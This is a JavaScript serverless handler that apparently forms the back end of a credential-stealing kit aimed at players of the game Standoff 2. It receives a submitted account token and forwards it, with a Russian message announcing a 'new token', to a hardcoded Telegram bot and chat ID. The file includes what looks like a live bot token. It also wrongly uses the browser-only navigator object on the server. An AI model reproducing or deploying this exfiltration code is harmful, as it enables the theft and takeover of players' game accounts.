```javascript
const BOT_TOKEN = '8982132797:AAElq8HcYSllD37qGa2WNrER2H6ijw-Gemg'; 
const CHAT_ID = '5273721155';

exports.handler = async (event, context) => {
    if (event.httpMethod !== 'POST') {
        return { statusCode: 405, body: 'Method Not Allowed' };
    }

    try {
        const data = JSON.parse(event.body);
        const message = `🔥 <b>Новый токен Standoff 2!</b>\n\nUser Agent: ${navigator.userAgent || 'Unknown'}\n\n<b>TOKEN:</b>\n<code>${data.token}</code>`;
        
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        return { statusCode: 200, body: 'OK' };
    } catch (error) {
        return { statusCode: 500, body: 'Error' };
    }
};
```